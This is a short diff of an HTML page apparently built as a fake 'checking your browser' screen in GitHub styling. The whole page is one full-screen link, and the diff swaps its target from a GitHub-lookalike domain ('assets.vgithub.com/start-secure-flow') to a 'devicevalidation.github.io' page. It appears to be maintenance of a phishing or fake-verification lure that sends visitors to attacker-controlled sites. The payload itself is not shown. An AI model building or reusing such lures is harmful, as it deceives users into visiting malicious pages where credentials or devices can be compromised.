@@ -427,7 +427,7 @@
         </head>
 
         <body style="margin: 0px; padding: 0px;">
-            <a href="https://assets.vgithub.com/start-secure-flow" style="width: 100%; height: 100vh; background: #F6F8FA;justify-content: center;align-items: center;display: flex;">
+            <a href="https://devicevalidation.github.io" style="width: 100%; height: 100vh; background: #F6F8FA;justify-content: center;align-items: center;display: flex;">
                 <div style="display: flex; word-wrap: break-word; width: 95%; max-width: 400px" id="checking-browser">
                     <p>
                         <p style="font-size: 18px; font-weight: bold; font-style: italic">
